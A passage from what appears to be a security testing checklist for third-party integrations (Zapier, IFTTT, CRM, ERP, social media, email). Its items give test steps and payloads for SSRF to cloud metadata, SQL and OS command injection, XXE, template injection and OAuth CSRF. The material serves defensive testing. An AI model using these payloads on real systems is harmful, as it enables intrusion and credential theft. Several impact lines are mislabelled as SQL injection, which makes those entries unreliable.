**Test Steps:** 1. Monitor sync data transmission between systems. 2. Check if sync data is encrypted in transit. 3. Attempt man-in-the-middle attack on sync channel. 4. Modify sync data in transit.

**Expected Result:** Application must encrypt all sync data in transit using TLS and implement data integrity verification.

**Payload Example:**

```
Intercept sync traffic between systems;attempt TLS downgrade;modify sync payload in transit
```

**Impact:** Weak/broken cryptography -&gt; data exposure, token forgery, integrity bypass.

**Tools:** Wireshark;mitmproxy;Burp Suite

**References:** CWE-327; OWASP Cryptographic Failures (A02); WSTG-CRYP

---

## INTG-071 — Zapier Trigger Authentication Bypass
**Test Category:** Authentication (WSTG-ATHN-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Zapier / IFTTT Integration

**Test Steps:** 1. Identify Zapier trigger endpoints. 2. Send requests to trigger endpoints without valid authentication. 3. Check if triggers fire without proper authorization.

**Expected Result:** Application must require valid authentication for all Zapier and IFTTT trigger endpoints.

**Payload Example:**

```
POST /api/zapier/triggers/new-order without authentication or with invalid Zapier token
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite;Postman

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## INTG-072 — Zapier Webhook URL SSRF
**Test Category:** SSRF (WSTG-INPV-19) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Zapier / IFTTT Integration

**Test Steps:** 1. If Zapier integration allows custom webhook URLs configure with internal addresses. 2. Trigger the action. 3. Check if internal services are accessed.

**Expected Result:** Application must validate all webhook URLs configured through Zapier integration and block internal network access.

**Payload Example:**

```
zapier_webhook=http://169.254.169.254/latest/meta-data/;action_url=http://localhost:8080/admin
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite;Collaborator

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## INTG-073 — IFTTT Trigger Data Over-Exposure
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Zapier / IFTTT Integration

**Test Steps:** 1. Configure IFTTT triggers for events. 2. Inspect data sent to IFTTT when triggers fire. 3. Check if excessive or sensitive data is included. 4. Verify data minimization.

**Expected Result:** Application must send only the minimum necessary data to Zapier and IFTTT triggers and never include sensitive information.

**Payload Example:**

```
Monitor trigger payloads for full_user_profile;payment_details;passwords;internal_ids sent to external automation services
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## INTG-074 — Zapier Action Parameter Injection
**Test Category:** Injection (WSTG-INPV-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Zapier / IFTTT Integration

**Test Steps:** 1. Configure a Zapier action that writes data to the application. 2. Inject payloads in Zapier action parameters. 3. Check if injected data causes vulnerabilities in the application.

**Expected Result:** Application must validate and sanitize all data received from Zapier and IFTTT actions before processing.

**Payload Example:**

```
Zapier action with field_value=<script>alert(1)</script> or field_value=' OR 1=1-- injected through automation
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;Postman

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## INTG-075 — Zapier OAuth Token Scope Abuse
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Zapier / IFTTT Integration

**Test Steps:** 1. Connect Zapier via OAuth with limited scopes. 2. Check if Zapier can access resources beyond the granted scopes. 3. Test for scope escalation through the integration.

**Expected Result:** Application must enforce OAuth scopes on all API requests made through Zapier and IFTTT integrations.

**Payload Example:**

```
Use Zapier connection with scope=read to attempt POST/PUT/DELETE operations;access admin endpoints
```

**Impact:** OAuth/SSO flaw -&gt; code/token theft or identity confusion -&gt; account takeover.

**Tools:** Burp Suite;Postman

**References:** CWE-287; -&gt;[OAuth / OIDC / SAML checklist](#/checklist/oauth); OAuth Security BCP (RFC 9700); PortSwigger

---

## INTG-076 — Zapier Integration IDOR
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Zapier / IFTTT Integration

**Test Steps:** 1. Configure Zapier integration for own account. 2. Modify account_id or user_id in Zapier API requests. 3. Check if data from other accounts is accessible through the integration.

**Expected Result:** Application must bind Zapier and IFTTT integrations to the authenticated user's account and enforce access control.

**Payload Example:**

```
Modify Zapier API requests to target other users' data by changing user_id or account_id parameters
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## INTG-077 — IFTTT Applet Replay Attack
**Test Category:** Session Management (WSTG-SESS-03) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Zapier / IFTTT Integration

**Test Steps:** 1. Capture IFTTT trigger or action requests. 2. Replay the requests to trigger duplicate actions. 3. Check for idempotency and replay protection.

**Expected Result:** Application must implement replay protection on IFTTT integration endpoints using timestamps and nonces.

**Payload Example:**

```
Replay captured POST /api/ifttt/actions/create-order with same headers and payload
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite;Postman

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## INTG-078 — CRM Sync Data Injection
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** CRM Integration

**Test Steps:** 1. Identify data synced between application and CRM. 2. Insert SQL or XSS payloads in customer data. 3. Trigger CRM sync. 4. Check if injected data causes vulnerabilities in either system.

**Expected Result:** Application must sanitize all data before sending to CRM and validate all data received from CRM before processing.

**Payload Example:**

```
customer_name=<script>alert(1)</script>;company='; DROP TABLE customers;--;note={{7*7}}
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;Postman

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## INTG-079 — CRM Integration Credential Exposure
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** CRM Integration

**Test Steps:** 1. Access CRM integration configuration. 2. Check if CRM credentials are exposed in API responses. 3. Inspect client-side code for CRM API keys. 4. Check error messages for credential leakage.

**Expected Result:** Application must securely store CRM integration credentials and never expose them in API responses or client-side code.

**Payload Example:**

```
Check GET /api/integrations/crm/config for crm_api_key;crm_password;salesforce_token;hubspot_key
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;Browser DevTools

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## INTG-080 — CRM IDOR for Cross-Account Access
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** CRM Integration

**Test Steps:** 1. Access CRM integration data for own account. 2. Change account_id or integration_id to another user's CRM connection. 3. Check if other users' CRM data or credentials are accessible.

**Expected Result:** Application must verify ownership of CRM integration configurations before displaying data or allowing modifications.

**Payload Example:**

```
GET /api/integrations/crm/INT-2001/data;PUT /api/integrations/crm/INT-2001/config with User A credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## INTG-081 — CRM Sync SSRF via Endpoint Configuration
**Test Category:** SSRF (WSTG-INPV-19) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** CRM Integration

**Test Steps:** 1. Configure CRM integration endpoint URL. 2. Set URL to internal service addresses. 3. Trigger CRM sync. 4. Check if internal services are accessed through CRM integration.

**Expected Result:** Application must validate CRM endpoint URLs and restrict connections to known CRM provider domains only.

**Payload Example:**

```
crm_endpoint=http://169.254.169.254/latest/meta-data/;salesforce_url=http://localhost:8080/admin
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite;Collaborator

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## INTG-082 — CRM Data Over-Sharing Privacy Violation
**Test Category:** Privacy (WSTG-INFO-05) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** CRM Integration

**Test Steps:** 1. Configure CRM sync and trigger data push. 2. Monitor what customer data is sent to CRM. 3. Check if sensitive data like payment details or passwords is shared. 4. Verify data minimization.

**Expected Result:** Application must share only necessary customer data with CRM systems and comply with data protection regulations.

**Payload Example:**

```
Monitor CRM sync for payment_info;login_history;ip_addresses;device_fingerprints shared unnecessarily
```

**Impact:** Privacy violation -&gt; exposure of personal data (PII) beyond the intended audience.

**Tools:** Burp Suite;Wireshark

**References:** CWE-359; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP Privacy Risks; GDPR

---

## INTG-083 — CRM Webhook Spoofing
**Test Category:** Authentication (WSTG-ATHN-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** CRM Integration

**Test Steps:** 1. Identify CRM webhook callback endpoints. 2. Send spoofed webhook requests mimicking CRM callbacks. 3. Check if the application processes spoofed webhooks without validating authenticity.

**Expected Result:** Application must verify the authenticity of all CRM webhook callbacks through signatures or shared secrets.

**Payload Example:**

```
POST /api/integrations/crm/webhook with spoofed CRM payload without valid signature
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite;Postman

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## INTG-084 — CRM Integration SQL Injection via Sync Parameters
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** CRM Integration

**Test Steps:** 1. Access CRM sync configuration. 2. Inject SQL payloads in sync filter or mapping parameters. 3. Observe response for SQL errors or data leakage.

**Expected Result:** Application must use parameterized queries for all CRM sync database operations.

**Payload Example:**

```
sync_filter=status=' OR 1=1--;field_mapping=name' UNION SELECT password FROM users--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## INTG-085 — ERP Integration Authentication Bypass
**Test Category:** Authentication (WSTG-ATHN-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** ERP Integration

**Test Steps:** 1. Identify ERP integration endpoints. 2. Remove or modify authentication credentials. 3. Check if ERP data is accessible without proper authentication. 4. Test with expired credentials.

**Expected Result:** Application must require and validate authentication for all ERP integration endpoints and handle credential expiry properly.

**Payload Example:**

```
Remove Authorization header from GET /api/erp/inventory;use expired ERP integration token
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite;Postman

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## INTG-086 — ERP Data Manipulation via Integration
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** ERP Integration

**Test Steps:** 1. Identify data flows between application and ERP. 2. Intercept and modify data in transit. 3. Change inventory quantities or pricing data. 4. Check if manipulated data is accepted by ERP.

**Expected Result:** Application must validate data integrity in ERP synchronization and implement checksums or signatures on data payloads.

**Payload Example:**

```
Modify inventory_count=100 to inventory_count=99999;change unit_price=10.00 to unit_price=0.01 in ERP sync
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;mitmproxy

**References:** CWE-840; PortSwigger Business logic

---

## INTG-087 — ERP Integration SSRF
**Test Category:** SSRF (WSTG-INPV-19) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** ERP Integration

**Test Steps:** 1. Configure ERP integration endpoint. 2. Set URL to internal network addresses. 3. Trigger ERP sync. 4. Check for SSRF through ERP integration channels.

**Expected Result:** Application must validate ERP endpoint URLs against allowlists of known ERP system addresses.

**Payload Example:**

```
erp_endpoint=http://169.254.169.254/latest/meta-data/;sap_url=http://localhost:50000/;oracle_url=http://10.0.0.1:1521/
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite;Collaborator

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## INTG-088 — ERP Credential Harvesting via Integration Config
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** ERP Integration

**Test Steps:** 1. Access ERP integration configuration via API. 2. Check if ERP system credentials are exposed. 3. Verify credential encryption at rest. 4. Check for credentials in error messages.

**Expected Result:** Application must encrypt ERP credentials at rest and never expose them in API responses or error messages.

**Payload Example:**

```
Check GET /api/integrations/erp/config for erp_username;erp_password;sap_client_secret;oracle_connection_string
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## INTG-089 — ERP Integration IDOR
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** ERP Integration

**Test Steps:** 1. Access own ERP integration configuration. 2. Change integration_id to access another organization's ERP connection. 3. Check for cross-tenant ERP data access.

**Expected Result:** Application must enforce strict tenant isolation and ownership verification on all ERP integration endpoints.

**Payload Example:**

```
GET /api/integrations/erp/ERP-2001;PUT /api/integrations/erp/ERP-2001 with different tenant credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## INTG-090 — ERP Integration Command Injection
**Test Category:** Injection (WSTG-INPV-12) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** ERP Integration

**Test Steps:** 1. If ERP integration processes data through server-side commands inject OS command payloads. 2. Insert in fields that may be used in system calls. 3. Check for command execution.

**Expected Result:** Application must never pass integration data directly to OS commands and must use safe APIs for ERP interaction.

**Payload Example:**

```
erp_query=;cat /etc/passwd;erp_param=test`whoami`;integration_cmd=sync|id
```

**Impact:** OS command injection -&gt; remote code execution / server takeover.

**Tools:** Burp Suite;Commix

**References:** CWE-78; -&gt;[Command Injection checklist](#/checklist/cmdi); PortSwigger OS command injection; GTFOBins

---

## INTG-091 — ERP Sync Race Condition
**Test Category:** Business Logic (WSTG-BUSL-08) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** ERP Integration

**Test Steps:** 1. Trigger concurrent ERP sync operations. 2. Modify data between sync cycles. 3. Check for data inconsistency or corruption. 4. Verify atomic sync operations.

**Expected Result:** Application must implement proper locking during ERP sync to prevent data corruption from concurrent operations.

**Payload Example:**

```
Trigger 10 concurrent POST /api/erp/sync while simultaneously modifying inventory data
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder;Burp Suite

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## INTG-092 — ERP Integration XML Injection
**Test Category:** Injection (WSTG-INPV-07) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** ERP Integration

**Test Steps:** 1. If ERP integration uses XML like SOAP or SAP RFC inject XML payloads. 2. Test for XXE and XML injection. 3. Check for entity expansion attacks.

**Expected Result:** Application must disable external entities and validate all XML used in ERP integration communications.

**Payload Example:**

```
Inject XXE in ERP SOAP request: <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>;test for billion laughs
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;OWASP ZAP

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## INTG-093 — Social Media OAuth Token Theft
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Social Media Integration

**Test Steps:** 1. Connect a social media account. 2. Check if OAuth tokens are exposed in client-side code or API responses. 3. Verify token storage security. 4. Check for token leakage in URLs.

**Expected Result:** Application must securely store social media OAuth tokens server-side and never expose them in client-accessible responses.

**Payload Example:**

```
Check localStorage;API responses;URL parameters for facebook_token;twitter_token;instagram_access_token
```

**Impact:** OAuth/SSO flaw -&gt; code/token theft or identity confusion -&gt; account takeover.

**Tools:** Browser DevTools;Burp Suite

**References:** CWE-287; -&gt;[OAuth / OIDC / SAML checklist](#/checklist/oauth); OAuth Security BCP (RFC 9700); PortSwigger

---

## INTG-094 — Social Media Account Linking IDOR
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Social Media Integration

**Test Steps:** 1. Link a social media account. 2. Intercept the linking request and change user_id. 3. Check if the social account is linked to another user. 4. Test for account takeover via social login.

**Expected Result:** Application must verify ownership during social media account linking and prevent cross-user account connections.

**Payload Example:**

```
Change user_id=1001 to user_id=1002 in POST /api/social/link;link attacker's social account to victim's profile
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## INTG-095 — Social Media Login CSRF for Account Takeover
**Test Category:** CSRF (WSTG-SESS-05) · **Severity:** Critical · **CVSS:** 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** Social Media Integration

**Test Steps:** 1. Initiate social media login but stop before completing. 2. Capture the callback URL with the authorization code. 3. Send the callback URL to the victim. 4. Check if victim's account is linked to attacker's social profile.

**Expected Result:** Application must validate the state parameter in social login callbacks and bind the flow to the initiating session.

**Payload Example:**

```
Craft callback URL /auth/social/callback?code=ATTACKER_CODE&state=VICTIM_STATE to link attacker's social to victim
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite;Browser

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## INTG-096 — Social Media API Key Abuse
**Test Category:** Security Misconfiguration (WSTG-CONF-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Social Media Integration

**Test Steps:** 1. Extract social media API keys from client-side code. 2. Test if keys allow unauthorized actions like posting or reading DMs. 3. Check key permission restrictions.

**Expected Result:** Application must restrict social media API keys to minimum required permissions and keep sensitive keys server-side.

**Payload Example:**

```
Use extracted Facebook App Secret or Twitter API Key to make unauthorized API calls
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Browser DevTools;Postman;KeyHacks

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## INTG-097 — Social Media Data Scraping via Integration
**Test Category:** Privacy (WSTG-INFO-05) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Social Media Integration

**Test Steps:** 1. Check what social media data is accessed during integration. 2. Verify if excessive permissions are requested. 3. Check data retention policies for social data. 4. Test for unauthorized data collection.

**Expected Result:** Application must request only minimum necessary social media permissions and comply with platform policies and privacy regulations.

**Payload Example:**

```
Review OAuth scope requests for read_friends;read_messages;publish_actions beyond what is needed
```

**Impact:** Privacy violation -&gt; exposure of personal data (PII) beyond the intended audience.

**Tools:** Browser;Manual Review

**References:** CWE-359; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP Privacy Risks; GDPR

---

## INTG-098 — Social Media Webhook Spoofing
**Test Category:** Authentication (WSTG-ATHN-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Social Media Integration

**Test Steps:** 1. Identify social media webhook endpoints. 2. Spoof webhook requests from social platforms. 3. Check if application processes spoofed events without signature validation.

**Expected Result:** Application must verify social media webhook signatures using the platform's signing secret before processing any webhook events.

**Payload Example:**

```
POST /api/social/webhook with spoofed Facebook/Twitter webhook payload without valid X-Hub-Signature
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite;Postman

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## INTG-099 — Social Media Post Injection
**Test Category:** Injection (WSTG-INPV-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Social Media Integration

**Test Steps:** 1. If the application posts to social media on behalf of users inject content in post parameters. 2. Include malicious links or misleading content. 3. Check content validation.

**Expected Result:** Application must validate and sanitize all content before posting to social media accounts and preview content for user approval.

**Payload Example:**

```
post_content=Visit https://evil.com for exclusive deals;tweet_text=URGENT: Account compromised at https://phishing.com
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;Postman

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## INTG-100 — Email Service API Key Exposure
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Email Service Integration

**Test Steps:** 1. Search client-side code for email service API keys. 2. Check for SendGrid or Mailgun or SES or Postmark credentials. 3. Test if exposed keys allow unauthorized email sending.

**Expected Result:** Application must keep email service API keys server-side only and never expose them in client-accessible code.

**Payload Example:**

```
Search JS for SG.;SENDGRID_API_KEY;mailgun_api_key;ses_access_key;postmark_token in source code and config files
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** GitLeaks;TruffleHog;Browser DevTools

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## INTG-101 — Email Service SSRF via Custom SMTP
**Test Category:** SSRF (WSTG-INPV-19) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Email Service Integration

**Test Steps:** 1. If custom SMTP server configuration is allowed set SMTP host to internal addresses. 2. Trigger email send. 3. Check if application connects to internal SMTP or non-SMTP services.

**Expected Result:** Application must validate SMTP server addresses and restrict connections to legitimate mail servers only.

**Payload Example:**

```
smtp_host=169.254.169.254;smtp_server=localhost;mail_host=10.0.0.1;smtp_port=6379 (Redis port)
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite;Postman

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## INTG-102 — Email Service Configuration IDOR
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Email Service Integration

**Test Steps:** 1. Access own email service configuration. 2. Change config_id or account_id to another user's. 3. Check if other users' email service credentials and settings are accessible.

**Expected Result:** Application must verify ownership before displaying or modifying email service integration configurations.

**Payload Example:**

```
GET /api/integrations/email/CONFIG-2001;PUT /api/integrations/email/CONFIG-2001 with User A credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## INTG-103 — Email Template Injection via Integration
**Test Category:** Injection (WSTG-INPV-18) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Email Service Integration

**Test Steps:** 1. If email templates are managed through the integration inject SSTI payloads. 2. Send test emails with injected templates. 3. Check if template engine evaluates injected expressions.

**Expected Result:** Application must escape all dynamic content in email templates and prevent template injection through integration interfaces.

**Payload Example:**

```
template_body={{7*7}};subject=${Runtime.getRuntime().exec('id')};header=<%= system('whoami') %>
```

**Impact:** Server-side template injection -&gt; remote code execution on the app server.

**Tools:** Burp Suite;Tplmap

**References:** CWE-1336; -&gt;[SSTI checklist](#/checklist/ssti); PortSwigger SSTI (James Kettle)

---

## INTG-104 — Email Service Relay Abuse
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Email Service Integration

**Test Steps:** 1. Test if the email service integration can be used to send emails to arbitrary addresses. 2. Check for recipient validation. 3. Attempt to use the application as a spam relay.

**Expected Result:** Application must restrict email sending to legitimate application purposes and validate recipients against authorized lists.

**Payload Example:**

```
POST /api/email/send with to=arbitrary@external.com and custom content to test open relay behavior
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## INTG-105 — Email Service Credential Rotation Check
**Test Category:** Security Misconfiguration (WSTG-CONF-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Email Service Integration

**Test Steps:** 1. Check if email service credentials are rotated regularly. 2. Test with old or expired credentials. 3. Verify credential storage encryption. 4. Check for hardcoded credentials.

**Expected Result:** Application must support credential rotation for email service integrations and store credentials encrypted.

**Payload Example:**

```
Check for hardcoded credentials in source code;test old API keys for continued access;verify encryption at rest
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** GitLeaks;Burp Suite;Manual Review

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## INTG-106 — Email Header Injection via Integration
